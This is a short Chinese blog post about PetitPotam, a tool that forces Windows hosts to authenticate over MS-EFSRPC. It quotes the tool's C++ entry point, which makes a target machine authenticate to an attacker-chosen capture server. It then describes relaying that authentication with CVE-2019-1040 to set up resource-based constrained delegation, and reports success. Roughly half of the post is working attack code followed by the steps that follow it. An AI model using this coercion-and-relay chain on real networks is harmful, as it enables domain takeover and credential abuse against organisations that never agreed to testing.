---
title: 触发主机强制认证的新方式--MS-EFSRPC
tags: 域渗透
---

https://github.com/topotam/PetitPotam

收到GitHub推送看到了一个新工具可以触发Windows认证，

通过MS-EFSRPC协议的`EfsRpcOpenFileRaw`函数

查看源代码

```c++
int wmain(int argc, wchar_t** argv, wchar_t** envp)
{
	wprintf(L"Usage: PetitPotam.exe <captureServerIP> <targetServerIP> \n");
	handle_t ht = Bind(argv[2]);
	HRESULT hr = NULL;
	PEXIMPORT_CONTEXT_HANDLE plop;
	SecureZeroMemory((char*)&(plop), sizeof(plop));
	wchar_t buffer[100];
	swprintf(buffer, 100, L"\\\\%s\\test\\topotam.exe", argv[1]);
	 
	long flag = 0;

	hr = EfsRpcOpenFileRaw(ht, &plop, buffer, flag);

	if (hr == ERROR_BAD_NETPATH) {
		wprintf(L"Attack success!!!\n");
	}
				
	return 0;
}
```

第四行向目标机器RPC进行认证返回句柄，然后构造参数后直接调用`EfsRpcOpenFileRaw`这个API



老样子，认证还是SMB，是带签名的，可以配合CVE-2019-1040进行relay操作

![image-20210719144149900](https://images-1258433570.cos.ap-beijing.myqcloud.com/images/20210719144151.png)

然后中继机器收到请求

![image-20210719144233037](https://images-1258433570.cos.ap-beijing.myqcloud.com/images/20210719144241.png)

成功配置了RBCD